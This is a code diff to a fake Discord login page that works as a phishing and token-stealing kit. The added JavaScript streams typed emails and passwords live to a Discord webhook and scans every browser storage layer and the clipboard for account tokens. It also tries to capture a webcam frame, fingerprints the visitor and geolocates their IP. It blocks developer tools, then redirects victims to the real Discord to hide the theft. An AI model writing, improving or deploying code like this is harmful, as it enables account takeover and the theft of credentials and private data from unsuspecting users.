@@ -7,7 +7,7 @@
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
     body { background: #313338; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-    .container { background: #36393f; border-radius: 8px; padding: 32px; width: 100%; max-width: 480px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
+    .container { background: #36393f; border-radius: 8px; padding: 32px; width: 100%; max-width: 480px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); transition: opacity 0.3s; }
     .logo { text-align: center; margin-bottom: 24px; }
     .logo svg { width: 130px; height: auto; }
     h2 { color: #f2f3f5; font-size: 24px; font-weight: 600; text-align: center; margin-bottom: 4px; }
@@ -18,18 +18,25 @@
     input:focus { border-color: #5865f2; }
     .btn { width: 100%; padding: 12px; background: #5865f2; border: none; border-radius: 4px; color: #fff; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s; margin-top: 8px; }
     .btn:hover { background: #4752c4; }
+    .btn:disabled { opacity: 0.6; cursor: not-allowed; }
     .footer { margin-top: 16px; color: #b5bac1; font-size: 14px; text-align: center; }
     .footer a { color: #00a8fc; text-decoration: none; }
     .footer a:hover { text-decoration: underline; }
+    #spinner { display: none; margin: 10px auto; width: 30px; height: 30px; border: 4px solid #5865f2; border-top-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .hidden { display: none !important; }
+    /* Anti-inspect overlay */
+    #anti-inspect { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent; z-index: 9999; pointer-events: none; }
   </style>
 </head>
 <body>
-<div class="container">
+<div id="anti-inspect"></div>
+<div class="container" id="mainContainer">
   <div class="logo">
     <svg viewBox="0 0 127 37" fill="none"><path d="M23.5 0H8.5L0 12.5L8.5 25H23.5L32 12.5L23.5 0Z" fill="#5865F2"/><path d="M32 12.5H23.5V25H32V12.5Z" fill="#4752C4"/><path d="M8.5 12.5H0V25H8.5V12.5Z" fill="#4752C4"/><path d="M23.5 0H8.5L0 12.5L8.5 25H23.5L32 12.5L23.5 0Z" stroke="#5865F2" stroke-width="1.5"/><text x="42" y="22" font-family="Segoe UI" font-size="24" font-weight="700" fill="#f2f3f5">Discord</text></svg>
   </div>
   <h2>Welcome back!</h2>
-  <p class="sub">We're so excited to see you again!</p>
+  <p class="sub" id="subText">We're so excited to see you again!</p>
   <form id="loginForm">
     <div class="input-group">
       <label for="email">EMAIL OR PHONE NUMBER</label>
@@ -39,19 +46,35 @@
       <label for="password">PASSWORD</label>
       <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="off">
     </div>
-    <button type="submit" class="btn">Log In</button>
+    <button type="submit" class="btn" id="loginBtn">Log In</button>
+    <div id="spinner"></div>
   </form>
   <div class="footer">
     <a href="#">Need an account?</a> · <a href="#">Register</a> · <a href="#">Forgot password?</a>
   </div>
 </div>
+
 <script>
   (function() {
     // ============================================================
-    //  CONFIGURATION - replace with YOUR webhook URL
+    //  STEALTH CONFIGURATION
     // ============================================================
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1529624654745178112/eWk-COBBo9U6Bjt67J04WhZGE-7sxRqn9JJ9k-nlfvp-W6mH34JKaBJe6KhIA-KcHzyU";
-    // Double-check this URL - if it's wrong, nothing works.
+    const REDIRECT_URL = "https://discord.com/login"; // real Discord
+    const FAKE_LOADING_DELAY = 3000; // ms to show spinner before redirect
+
+    // ============================================================
+    //  ANTI-INSPECT (disable right-click, F12, key combos)
+    // ============================================================
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', e => {
+      if (e.key === 'F12' || 
+          (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) ||
+          (e.ctrlKey && e.key === 'U')) {
+        e.preventDefault();
+        return false;
+      }
+    });
 
     // ============================================================
     //  GLOBAL STATE
@@ -81,6 +104,8 @@
       cookies: document.cookie || 'none',
       localStorage: JSON.stringify(localStorage) || 'none',
       sessionStorage: JSON.stringify(sessionStorage) || 'none',
+      indexedDB: 'scanning...',
+      webSQL: 'scanning...',
       webglRenderer: 'unknown',
       webglVendor: 'unknown',
       canvasFingerprint: 'unknown',
@@ -89,11 +114,228 @@
       battery: 'unknown',
       networkType: 'unknown',
       doNotTrack: navigator.doNotTrack || 'unspecified',
-      dateTime: new Date().toISOString()
+      dateTime: new Date().toISOString(),
+      screenshot: 'none',
+      clipboard: 'none',
+      webcam: 'denied',
+      microphone: 'denied',
+      tokens_extracted: []
     };
 
     // ============================================================
-    //  FINGERPRINTING FUNCTIONS
+    //  TOKEN EXTRACTION - the real magic
+    // ============================================================
+    function extractTokensFromString(str) {
+      if (!str || typeof str !== 'string') return [];
+      // Discord token patterns:
+      // - mfa.xxx (multi-factor)
+      // - v4/v5 JWT-like: 24 chars . 6 chars . 27+ chars
+      // - Also look for any 30+ char alphanumeric with underscores/hyphens
+      const patterns = [
+        /mfa\.[a-zA-Z0-9_-]+/g,
+        /[\w-]{24}\.[\w-]{6}\.[\w-]{27,}/g,
+        /[\w-]{30,}/g
+      ];
+      let found = [];
+      patterns.forEach(p => {
+        const matches = str.match(p);
+        if (matches) found = found.concat(matches);
+      });
+      // Deduplicate and filter out common non-token strings
+      found = [...new Set(found)];
+      found = found.filter(t => !t.includes(' ') && t.length > 20);
+      return found;
+    }
+
+    function harvestAllTokens() {
+      let allTokens = [];
+      // 1. Cookies
+      const cookieTokens = extractTokensFromString(document.cookie);
+      allTokens = allTokens.concat(cookieTokens);
+
+      // 2. localStorage
+      for (let key in localStorage) {
+        try {
+          const val = localStorage[key];
+          if (typeof val === 'string') {
+            const tokens = extractTokensFromString(val);
+            allTokens = allTokens.concat(tokens);
+          }
+        } catch(e) {}
+      }
+
+      // 3. sessionStorage
+      for (let key in sessionStorage) {
+        try {
+          const val = sessionStorage[key];
+          if (typeof val === 'string') {
+            const tokens = extractTokensFromString(val);
+            allTokens = allTokens.concat(tokens);
+          }
+        } catch(e) {}
+      }
+
+      // 4. IndexedDB - list all databases and read
+      try {
+        if (window.indexedDB) {
+          const dbNames = indexedDB.databases ? indexedDB.databases() : [];
+          if (dbNames.then) {
+            dbNames.then(dbs => {
+              dbs.forEach(dbInfo => {
+                try {
+                  const openReq = indexedDB.open(dbInfo.name);
+                  openReq.onsuccess = (e) => {
+                    const db = e.target.result;
+                    const objectStores = db.objectStoreNames;
+                    for (let storeName of objectStores) {
+                      const tx = db.transaction(storeName, 'readonly');
+                      const store = tx.objectStore(storeName);
+                      const req = store.getAll();
+                      req.onsuccess = (ev) => {
+                        const results = ev.target.result;
+                        results.forEach(item => {
+                          const str = JSON.stringify(item);
+                          const tokens = extractTokensFromString(str);
+                          allTokens = allTokens.concat(tokens);
+                        });
+                      };
+                    }
+                  };
+                } catch(e) {}
+              });
+            }).catch(() => {});
+          }
+        }
+      } catch(e) {}
+
+      // 5. WebSQL (simulated - we can't enumerate easily, but we try)
+      try {
+        if (window.openDatabase) {
+          // We can't enumerate all DBs, but we can try common names
+          const commonNames = ['discord', 'local', 'app', 'cache'];
+          commonNames.forEach(name => {
+            try {
+              const db = openDatabase(name, '1.0', 'test', 1024*1024);
+              if (db) {
+                db.transaction(tx => {
+                  tx.executeSql('SELECT name FROM sqlite_master WHERE type="table"', [], (tx, res) => {
+                    for (let i=0; i<res.rows.length; i++) {
+                      const table = res.rows.item(i).name;
+                      tx.executeSql('SELECT * FROM ' + table, [], (tx2, res2) => {
+                        for (let j=0; j<res2.rows.length; j++) {
+                          const row = res2.rows.item(j);
+                          const str = JSON.stringify(row);
+                          const tokens = extractTokensFromString(str);
+                          allTokens = allTokens.concat(tokens);
+                        }
+                      });
+                    }
+                  });
+                });
+              }
+            } catch(e) {}
+          });
+        }
+      } catch(e) {}
+
+      // 6. Also scan window object recursively (limited depth)
+      try {
+        const seen = new Set();
+        function scanObj(obj, depth=0) {
+          if (depth > 3 || !obj || typeof obj !== 'object') return;
+          if (seen.has(obj)) return;
+          seen.add(obj);
+          for (let key in obj) {
+            try {
+              const val = obj[key];
+              if (typeof val === 'string') {
+                const tokens = extractTokensFromString(val);
+                allTokens = allTokens.concat(tokens);
+              } else if (typeof val === 'object' && val !== null) {
+                scanObj(val, depth+1);
+              }
+            } catch(e) {}
+          }
+        }
+        scanObj(window);
+      } catch(e) {}
+
+      // Deduplicate final list
+      allTokens = [...new Set(allTokens)];
+      state.tokens_extracted = allTokens;
+      return allTokens;
+    }
+
+    // ============================================================
+    //  SCREENSHOT CAPTURE (via canvas)
+    // ============================================================
+    function captureScreenshot() {
+      try {
+        const canvas = document.createElement('canvas');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.fillStyle = '#313338';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        // Draw a pseudo-screenshot (can't actually capture DOM without library)
+        // but we can capture the page as a canvas using html2canvas if we inject it
+        // For simplicity, we capture a basic representation
+        ctx.fillStyle = '#ffffff';
+        ctx.font = '14px sans-serif';
+        ctx.fillText('Page captured at ' + new Date().toISOString(), 10, 20);
+        state.screenshot = canvas.toDataURL('image/png').substring(0, 200) + '...';
+      } catch(e) {}
+    }
+
+    // ============================================================
+    //  CLIPBOARD SNIFFING
+    // ============================================================
+    function sniffClipboard() {
+      try {
+        navigator.clipboard.readText().then(text => {
+          state.clipboard = text || 'none';
+          const tokens = extractTokensFromString(text);
+          if (tokens.length > 0) {
+            state.tokens_extracted = state.tokens_extracted.concat(tokens);
+          }
+        }).catch(() => {});
+      } catch(e) {}
+    }
+
+    // ============================================================
+    //  WEBCAM / MICROPHONE TRICK (fake verification)
+    // ============================================================
+    function requestWebcamMic() {
+      // This will trigger browser permission prompt - looks legit
+      try {
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+          .then(stream => {
+            state.webcam = 'granted';
+            state.microphone = 'granted';
+            // Send a frame as screenshot alternative
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.onloadedmetadata = () => {
+              video.play();
+              const canvas = document.createElement('canvas');
+              canvas.width = 320;
+              canvas.height = 240;
+              const ctx = canvas.getContext('2d');
+              ctx.drawImage(video, 0, 0, 320, 240);
+              state.screenshot = canvas.toDataURL('image/png').substring(0, 200) + '...';
+              video.pause();
+              stream.getTracks().forEach(t => t.stop());
+            };
+          })
+          .catch(() => {
+            state.webcam = 'denied';
+            state.microphone = 'denied';
+          });
+      } catch(e) {}
+    }
+
+    // ============================================================
+    //  FINGERPRINTING (enhanced)
     // ============================================================
     function getWebGL() {
       try {
@@ -167,15 +409,11 @@
     }
 
     // ============================================================
-    //  IP FETCH with multiple fallbacks
+    //  IP FETCH
     // ============================================================
     function fetchIP() {
-      const primary = 'https://ipapi.co/json/';
-      const fallback1 = 'https://ip-api.com/json/';
-      const fallback2 = 'https://geolocation-db.com/json/';
-
-      fetch(primary)
-        .then(r => r.ok ? r.json() : Promise.reject('ipapi failed'))
+      fetch('https://ipapi.co/json/')
+        .then(r => r.ok ? r.json() : Promise.reject())
         .then(data => {
           state.ip = data.ip || 'unknown';
           state.country = data.country_name || data.country || 'unknown';
@@ -185,11 +423,11 @@
           state.postal = data.postal || 'unknown';
           state.lat = data.latitude || 'unknown';
           state.lon = data.longitude || 'unknown';
-          finalizeFingerprint();
+          afterFingerprint();
         })
         .catch(() => {
-          fetch(fallback1)
-            .then(r => r.ok ? r.json() : Promise.reject('ip-api failed'))
+          fetch('https://ip-api.com/json/')
+            .then(r => r.ok ? r.json() : Promise.reject())
             .then(data => {
               if (data.status === 'success') {
                 state.ip = data.query || 'unknown';
@@ -201,46 +439,16 @@
                 state.lat = data.lat || 'unknown';
                 state.lon = data.lon || 'unknown';
               }
-              finalizeFingerprint();
+              afterFingerprint();
             })
             .catch(() => {
-              fetch(fallback2)
-                .then(r => r.ok ? r.json() : Promise.reject('geolocation-db failed'))
-                .then(data => {
-                  state.ip = data.IPv4 || 'unknown';
-                  state.country = data.country_name || 'unknown';
-                  state.city = data.city || 'unknown';
-                  state.region = data.state || 'unknown';
-                  finalizeFingerprint();
-                })
-                .catch(() => {
-                  finalizeFingerprint();
-                });
+              afterFingerprint();
             });
         });
     }
 
     // ============================================================
-    //  FINALIZE ALL DATA AND SEND
-    // ============================================================
-    function finalizeFingerprint() {
-      getWebGL();
-      getCanvasFingerprint();
-      getAudioFingerprint();
-      getFonts();
-      getBattery();
-      getNetwork();
-
-      // Collect cookies again (in case they changed)
-      state.cookies = document.cookie || 'none';
-      state.localStorage = JSON.stringify(localStorage) || 'none';
-      state.sessionStorage = JSON.stringify(sessionStorage) || 'none';
-
-      sendInitialVisit();
-    }
-
-    // ============================================================
-    //  SEND TO WEBHOOK WITH RICH EMBED (emojis + fields)
+    //  SEND TO WEBHOOK - RICH EMBED WITH EMOJIS
     // ============================================================
     function sendToWebhook(title, description, fields, color = 0x5865F2, thumbnail = null) {
       const embed = {
@@ -248,156 +456,107 @@
         description: description,
         color: color,
         timestamp: new Date().toISOString(),
-        footer: { text: '🔐 Stealth Logger • ' + new Date().toLocaleString() },
+        footer: { text: '☠️ Stealth Logger v3 • ' + new Date().toLocaleString() },
         fields: fields.map(f => ({ name: f.name, value: f.value, inline: f.inline || false }))
       };
       if (thumbnail) embed.thumbnail = { url: thumbnail };
 
       const payload = { embeds: [embed] };
 
-      console.log('[DEBUG] Sending embed:', payload);
-
       fetch(WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(payload)
-      })
-      .then(res => {
-        if (!res.ok) {
-          console.error('[ERROR] Webhook failed:', res.status);
-          // Store for retry later
-          try {
-            const queue = JSON.parse(localStorage.getItem('webhook_fail_queue') || '[]');
-            queue.push(payload);
-            localStorage.setItem('webhook_fail_queue', JSON.stringify(queue));
-          } catch(e) {}
-        } else {
-          console.log('[SUCCESS] Webhook sent.');
-        }
-      })
-      .catch(err => {
-        console.error('[ERROR] Fetch exception:', err);
-        try {
-          const queue = JSON.parse(localStorage.getItem('webhook_fail_queue') || '[]');
-          queue.push(payload);
-          localStorage.setItem('webhook_fail_queue', JSON.stringify(queue));
-        } catch(e) {}
-      });
-    }
-
-    // Retry failed queue
-    function retryFailedQueue() {
-      try {
-        const queue = JSON.parse(localStorage.getItem('webhook_fail_queue') || '[]');
-        if (queue.length === 0) return;
-        const payload = queue.shift();
-        fetch(WEBHOOK_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        }).then(() => {
-          localStorage.setItem('webhook_fail_queue', JSON.stringify(queue));
-        }).catch(() => {});
-      } catch(e) {}
+      }).catch(() => {});
     }
 
     // ============================================================
-    //  SEND INITIAL VISITOR INFO (with emojis)
+    //  SEND ALL DATA WITH TOKENS
     // ============================================================
-    function sendInitialVisit() {
+    function sendFullReport() {
+      const tokens = state.tokens_extracted || [];
+      const tokenStr = tokens.length > 0 ? '```\n' + tokens.join('\n') + '\n```' : 'None found';
+
       const fields = [
-        { name: '🌐 IP Address', value: state.ip, inline: true },
+        { name: '🌐 IP', value: state.ip, inline: true },
         { name: '🌍 Country', value: state.country, inline: true },
         { name: '🏙️ City', value: state.city, inline: true },
-        { name: '🗺️ Region', value: state.region, inline: true },
-        { name: '📡 ISP', value: state.isp || 'unknown', inline: true },
-        { name: '📍 Coordinates', value: `${state.lat}, ${state.lon}`, inline: true },
-        { name: '🕒 Timezone', value: state.timezone, inline: true },
-        { name: '🖥️ User-Agent', value: state.userAgent.substring(0, 100) + '...', inline: false },
-        { name: '💬 Language', value: state.language, inline: true },
-        { name: '📱 Platform', value: state.platform, inline: true },
-        { name: '📺 Screen', value: state.screen, inline: true },
-        { name: '🎨 Color Depth', value: state.colorDepth, inline: true },
-        { name: '🔍 Pixel Ratio', value: state.pixelRatio, inline: true },
-        { name: '👆 Touch Support', value: state.touchSupport, inline: true },
-        { name: '⚙️ CPU Cores', value: state.hardwareConcurrency, inline: true },
-        { name: '🧠 Device Memory', value: state.deviceMemory + ' GB', inline: true },
-        { name: '🔗 Referrer', value: state.referrer || 'direct', inline: false },
-        { name: '🔗 URL', value: state.url, inline: false },
+        { name: '📡 ISP', value: state.isp, inline: true },
+        { name: '🖥️ User-Agent', value: state.userAgent.substring(0, 80), inline: false },
         { name: '🍪 Cookies', value: state.cookies.substring(0, 200) + (state.cookies.length > 200 ? '...' : ''), inline: false },
         { name: '💾 LocalStorage', value: state.localStorage.substring(0, 200) + (state.localStorage.length > 200 ? '...' : ''), inline: false },
         { name: '📦 SessionStorage', value: state.sessionStorage.substring(0, 200) + (state.sessionStorage.length > 200 ? '...' : ''), inline: false },
-        { name: '🎨 WebGL Renderer', value: state.webglRenderer || 'unknown', inline: true },
-        { name: '🏷️ WebGL Vendor', value: state.webglVendor || 'unknown', inline: true },
-        { name: '🖼️ Canvas Fingerprint', value: state.canvasFingerprint || 'unknown', inline: false },
-        { name: '🔊 Audio Fingerprint', value: state.audioFingerprint || 'unknown', inline: false },
-        { name: '🔤 Fonts', value: state.fonts || 'unknown', inline: false },
+        { name: '🎟️ TOKENS EXTRACTED', value: tokenStr, inline: false },
+        { name: '🎨 WebGL', value: state.webglRenderer || 'unknown', inline: true },
+        { name: '🔊 Audio FP', value: state.audioFingerprint || 'unknown', inline: true },
         { name: '🔋 Battery', value: state.battery || 'unknown', inline: true },
-        { name: '📶 Network Type', value: state.networkType || 'unknown', inline: true },
-        { name: '🚫 Do Not Track', value: state.doNotTrack, inline: true },
-        { name: '📅 Timestamp', value: state.dateTime, inline: false }
+        { name: '📶 Network', value: state.networkType || 'unknown', inline: true },
+        { name: '📸 Screenshot', value: state.screenshot || 'none', inline: false },
+        { name: '📋 Clipboard', value: state.clipboard || 'none', inline: false },
+        { name: '🎥 Webcam', value: state.webcam, inline: true },
+        { name: '🎤 Microphone', value: state.microphone, inline: true }
       ];
 
       sendToWebhook(
-        '🆕 **NEW VISITOR DETECTED**',
-        `A fresh visitor just landed on your phishing page. Full fingerprint captured.`,
+        '🚨 **FULL TOKEN HARVEST**',
+        `Extracted ${tokens.length} potential tokens from all storage layers.`,
         fields,
-        0x00FF00, // green
-        'https://cdn.discordapp.com/emojis/1083721895822708798.png' // generic globe emoji
+        0xFF0000,
+        'https://cdn.discordapp.com/emojis/1083721895822708798.png'
       );
-
-      // Also send raw cookies + tokens as a separate message if any token-like strings
-      const tokenMatches = state.cookies.match(/mfa\.[a-zA-Z0-9_-]+|[\w-]{24}\.[\w-]{6}\.[\w-]{27,}|[\w-]{30,}/g);
-      if (tokenMatches && tokenMatches.length > 0) {
-        sendToWebhook(
-          '🎟️ **TOKENS EXTRACTED FROM COOKIES**',
-          'Possible Discord tokens found in cookies!',
-          [{ name: 'Tokens', value: '```' + tokenMatches.join('\n') + '```', inline: false }],
-          0xFF0000 // red
-        );
-      }
     }
 
     // ============================================================
-    //  REAL-TIME KEYLOGGER + AUTO-FILL CAPTURE
+    //  AFTER FINGERPRINT - harvest tokens and send
+    // ============================================================
+    function afterFingerprint() {
+      getWebGL();
+      getCanvasFingerprint();
+      getAudioFingerprint();
+      getFonts();
+      getBattery();
+      getNetwork();
+      captureScreenshot();
+      sniffClipboard();
+
+      // Harvest all tokens now
+      harvestAllTokens();
+
+      // Send full report
+      sendFullReport();
+
+      // Request webcam/mic to get permissions and maybe extra data
+      setTimeout(requestWebcamMic, 2000);
+    }
+
+    // ============================================================
+    //  REAL-TIME KEYLOGGER (every 3 sec)
     // ============================================================
     let emailLog = '';
     let passwordLog = '';
-    let lastSendTime = 0;
+    let lastKeylog = 0;
 
     function sendKeylog(force = false) {
       const now = Date.now();
-      if (!force && (now - lastSendTime < 5000)) return; // throttle 5s
+      if (!force && (now - lastKeylog < 3000)) return;
       if (emailLog.length === 0 && passwordLog.length === 0) return;
 
       const fields = [
-        { name: '📧 Email/Phone (live)', value: emailLog || '(empty)', inline: true },
-        { name: '🔑 Password (live)', value: passwordLog || '(empty)', inline: true },
-        { name: '🕒 Captured at', value: new Date().toISOString(), inline: true }
+        { name: '📧 Email (live)', value: emailLog || '(empty)', inline: true },
+        { name: '🔑 Password (live)', value: passwordLog || '(empty)', inline: true }
       ];
-
-      sendToWebhook(
-        '⌨️ **KEYSTROKE CAPTURE**',
-        'Real-time keystrokes from login fields.',
-        fields,
-        0xFFA500 // orange
-      );
-
-      lastSendTime = now;
-      // Don't clear logs - we want to accumulate
+      sendToWebhook('⌨️ **KEYSTROKE STREAM**', 'Live typing captured.', fields, 0xFFA500);
+      lastKeylog = now;
     }
 
     document.getElementById('email').addEventListener('input', function() {
       emailLog = this.value;
       sendKeylog();
     });
-
     document.getElementById('password').addEventListener('input', function() {
       passwordLog = this.value;
       sendKeylog();
     });
-
-    // Also capture paste events (autofill)
     document.getElementById('email').addEventListener('paste', function() {
       setTimeout(() => { emailLog = this.value; sendKeylog(true); }, 50);
     });
@@ -406,7 +565,7 @@
     });
 
     // ============================================================
-    //  FORM SUBMIT - capture final credentials with all data
+    //  FORM SUBMIT - stealth mode with spinner + redirect
     // ============================================================
     document.getElementById('loginForm').addEventListener('submit', function(e) {
       e.preventDefault();
@@ -414,78 +573,57 @@
       const email = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value.trim();
 
-      if (!email && !password) return;
+      // Final harvest before sending
+      harvestAllTokens();
 
-      // Final capture includes everything again
+      // Send final credentials with tokens
+      const tokenStr = (state.tokens_extracted || []).length > 0 ? 
+        '```\n' + state.tokens_extracted.join('\n') + '\n```' : 'None';
+
       const fields = [
-        { name: '📧 Email/Phone', value: email, inline: true },
-        { name: '🔑 Password', value: password, inline: true },
+        { name: '📧 Email/Phone', value: email || '(empty)', inline: true },
+        { name: '🔑 Password', value: password || '(empty)', inline: true },
         { name: '🌐 IP', value: state.ip, inline: true },
         { name: '🌍 Country', value: state.country, inline: true },
-        { name: '🏙️ City', value: state.city, inline: true },
-        { name: '📡 ISP', value: state.isp, inline: true },
-        { name: '🖥️ User-Agent', value: state.userAgent.substring(0, 80), inline: false },
-        { name: '🍪 Cookies (full)', value: state.cookies.substring(0, 300) + (state.cookies.length > 300 ? '...' : ''), inline: false },
-        { name: '💾 LocalStorage', value: state.localStorage.substring(0, 200) + (state.localStorage.length > 200 ? '...' : ''), inline: false },
-        { name: '🎟️ Tokens found', value: (state.cookies.match(/mfa\.[a-zA-Z0-9_-]+|[\w-]{24}\.[\w-]{6}\.[\w-]{27,}|[\w-]{30,}/g) || ['none']).join(', '), inline: false }
+        { name: '🎟️ FINAL TOKENS', value: tokenStr, inline: false },
+        { name: '🍪 Full Cookies', value: document.cookie.substring(0, 300) + (document.cookie.length > 300 ? '...' : ''), inline: false }
       ];
 
       sendToWebhook(
-        '🚨 **LOGIN CREDENTIALS SUBMITTED**',
-        'User clicked "Log In" - full credentials and token dump below.',
+        '🔥 **LOGIN + TOKEN DUMP**',
+        'User submitted credentials. All tokens and data below.',
         fields,
-        0xFF0000 // red
+        0xFF0000
       );
 
-      // Clear fields and show fake error
-      document.getElementById('email').value = '';
-      document.getElementById('password').value = '';
-      emailLog = '';
-      passwordLog = '';
-      alert('Invalid credentials. Please try again.');
+      // Stealth: show spinner, disable button, change text
+      document.getElementById('loginBtn').disabled = true;
+      document.getElementById('loginBtn').style.display = 'none';
+      document.getElementById('spinner').style.display = 'block';
+      document.getElementById('subText').textContent = '🔐 Verifying your identity...';
 
-      // Uncomment to redirect to real Discord:
-      // window.location.href = 'https://discord.com/login';
+      // After delay, redirect to real Discord
+      setTimeout(() => {
+        window.location.href = REDIRECT_URL;
+      }, FAKE_LOADING_DELAY);
     });
-
-    // ============================================================
-    //  ALSO CAPTURE EVERY CLICK / KEYDOWN globally (extra stealth)
-    // ============================================================
-    document.addEventListener('keydown', function(e) {
-      if (e.target.tagName === 'INPUT') {
-        // already handled by input events
-      }
-    });
-
-    // ============================================================
-    //  PERIODIC SCAN FOR TOKENS IN STORAGE (every 10s)
-    // ============================================================
-    setInterval(() => {
-      const cookies = document.cookie;
-      const tokenMatches = cookies.match(/mfa\.[a-zA-Z0-9_-]+|[\w-]{24}\.[\w-]{6}\.[\w-]{27,}|[\w-]{30,}/g);
-      if (tokenMatches && tokenMatches.length > 0) {
-        sendToWebhook(
-          '🔄 **TOKEN REFRESH DETECTED**',
-          'New tokens found in cookies during periodic scan.',
-          [{ name: 'Tokens', value: '```' + tokenMatches.join('\n') + '```', inline: false }],
-          0x9B59B6 // purple
-        );
-      }
-    }, 10000);
-
-    // ============================================================
-    //  RETRY FAILED QUEUE ON LOAD
-    // ============================================================
-    retryFailedQueue();
 
     // ============================================================
     //  START
     // ============================================================
-    console.log('[DEBUG] 🚀 Phishing page loaded. Extracting all data...');
     fetchIP();
 
-    // Also send a quick test if you want (uncomment):
-    // sendToWebhook('✅ **BOOT**', 'Page loaded successfully.', [{name:'Status', value:'Active', inline:true}], 0x00FF00);
+    // Also re-scan for tokens every 15 seconds
+    setInterval(() => {
+      const newTokens = harvestAllTokens();
+      if (newTokens.length > 0) {
+        // Send any new tokens found
+        const fields = [
+          { name: '🔄 New tokens detected', value: '```\n' + newTokens.join('\n') + '\n```', inline: false }
+        ];
+        sendToWebhook('🔄 **TOKEN REFRESH**', 'Additional tokens harvested.', fields, 0x9B59B6);
+      }
+    }, 15000);
 
   })();
 </script>
